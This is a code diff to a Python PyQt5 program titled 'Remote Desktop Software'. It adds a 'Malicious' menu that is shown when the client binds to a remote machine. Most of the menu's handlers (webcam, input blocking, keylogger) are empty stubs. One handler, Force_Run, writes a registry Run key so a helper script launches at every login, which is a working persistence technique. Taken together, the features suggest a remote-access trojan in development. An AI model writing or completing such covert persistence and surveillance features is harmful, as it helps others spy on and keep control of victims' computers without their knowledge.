@@ -1,7 +1,8 @@
+from os.path import realpath, dirname
 from sys import argv, exit as sysExit, path as sysPath
 sysPath.append(sysPath[0] + "\\externals")    #add the externals folder to the path in order to import external dependencies
 
-from PyQt5.QtWidgets import QMainWindow, QApplication, QShortcut, QMessageBox, QFileDialog, QPushButton
+from PyQt5.QtWidgets import QMainWindow, QApplication, QShortcut, QMessageBox, QFileDialog, QPushButton, QMenu
 from PyQt5.QtCore import Qt, pyqtSlot, QState
 from PyQt5.QtGui import QKeySequence, QIcon, QPalette, QColor, QImage
 from UI.main_window_ui import Ui_MainWindow
@@ -14,6 +15,12 @@ from UI.Palettes import WhitePalette, DarkPalette, MidnightPalette
 
 from mssServ import Server
 from mssClient import Client
+
+from cv2 import cvtColor
+from numpy import zeros, uint8, ones
+from winreg import OpenKeyEx, CloseKey, SetValueEx, REG_SZ, HKEY_CURRENT_USER, KEY_SET_VALUE
+
+import numpy    #remove after
 
 
 palettes = {
@@ -35,14 +42,15 @@ class Window(QMainWindow, Ui_MainWindow):
         super().__init__(parent)
         self.setupUi(self)  #read & load the compiled .ui file
 
-        self.addAction(self.action_Save_To)
-        self.addAction(self.action_UI)
-        self.addAction(self.action_Exit)
-        self.addAction(self.action_Fullscreen)
-        self.addAction(self.action_Connect)
-        self.addAction(self.action_Disconnect)
-        self.addAction(self.action_Bind)
-        self.addAction(self.action_Close)
+        #self.addAction(self.action_Save_To)
+        #self.addAction(self.action_UI)
+        #self.addAction(self.action_Exit)
+        #self.addAction(self.action_Fullscreen)
+        #self.addAction(self.action_Connect)
+        #self.addAction(self.action_Disconnect)
+        #self.addAction(self.action_Bind)
+        #self.addAction(self.action_Close)
+        #self.menuMalicious.menuAction().setVisible(False)
 
         self.fullscreenExitShortcut = QShortcut('ESC', self)
         self.fullscreenExitShortcut.activated.connect(lambda: self.ToggleFullscreen(self.windowState() & 11))   #change 3rd bit (fullscreen flag) to 0 (XXXX & 1011(11) = X0XX)
@@ -56,6 +64,7 @@ class Window(QMainWindow, Ui_MainWindow):
         self.ChangeTheme(tempTheme)
 
         self.label.updated.connect(self.label.updateBuffer)
+        self.label.updateBuffer(cvtColor(ones((600, 800), uint8), 8))
 
         self.bind = False
         self.connection = ""
@@ -64,12 +73,13 @@ class Window(QMainWindow, Ui_MainWindow):
     def ToggleFullscreen(self, newState):
         self.setWindowState(newState)
         self.menubar.setHidden(newState)
+        self.statusbar.setHidden(newState)
 
 
     def OpenWin(self, Win, name):
         self.win = Win(self)
         self.win.setAttribute(Qt.WA_DeleteOnClose)
-        self.win.setWindowIcon(QIcon("Gears.png"))
+        self.win.setWindowIcon(QIcon("assets\\Gears.png"))
         self.win.setWindowTitle(name)
         self.win.show()
 
@@ -116,7 +126,7 @@ class Window(QMainWindow, Ui_MainWindow):
         self.msgBox = QMessageBox()
         self.msgBox.setAttribute(Qt.WA_DeleteOnClose)
         self.msgBox.setText("are you sure you want to exit?")
-        self.msgBox.setWindowIcon(QIcon("Gears.png"))
+        self.msgBox.setWindowIcon(QIcon("assets\\Gears.png"))
         self.msgBox.setWindowTitle("Quit")
         self.msgBox.setStandardButtons(QMessageBox.No | QMessageBox.Yes)
         self.msgBox.setDefaultButton(QMessageBox.No)
@@ -173,6 +183,7 @@ class Window(QMainWindow, Ui_MainWindow):
         self.bind = True
         self.client = Client(self)
         self.client.start()
+        self.menuMalicious.menuAction().setVisible(True)
 
 
     @pyqtSlot()
@@ -183,6 +194,44 @@ class Window(QMainWindow, Ui_MainWindow):
         self.bind = False
         self.client.close()
         self.label.drawBlank()
+        self.menuMalicious.menuAction().setVisible(False)
+
+
+    @pyqtSlot()
+    def on_action_Start_Cam_triggered(self):
+        pass
+
+
+    @pyqtSlot()
+    def on_action_Stop_Cam_triggered(self):
+        pass
+
+
+    @pyqtSlot()
+    def on_action_Force_Run_triggered(self):
+        keyHandle = OpenKeyEx(HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", access=KEY_SET_VALUE)
+        SetValueEx(keyHandle, "remote", 0, REG_SZ, dirname(realpath(__file__)) + r"\helpers\run.py")
+        CloseKey(keyHandle)
+
+
+    @pyqtSlot()
+    def on_action_Block_Input_triggered(self):
+        pass
+
+
+    @pyqtSlot()
+    def on_action_Unblock_Input_triggered(self):
+        pass
+
+
+    @pyqtSlot()
+    def on_action_Start_KeyLogger_triggered(self):
+        pass
+
+
+    @pyqtSlot()
+    def on_action_Stop_KeyLogger_triggered(self):
+        pass
 
 
 if __name__ == '__main__':
@@ -190,7 +239,7 @@ if __name__ == '__main__':
     app.setStyle('Fusion')
     window = Window(app)
     window.setAttribute(Qt.WA_DeleteOnClose)
-    window.setWindowIcon(QIcon("remoteTrans.png"))
+    window.setWindowIcon(QIcon("assets\\remoteTrans.png"))
     window.setWindowTitle("Remote Desktop Software")
     window.show()
     app.exec_()
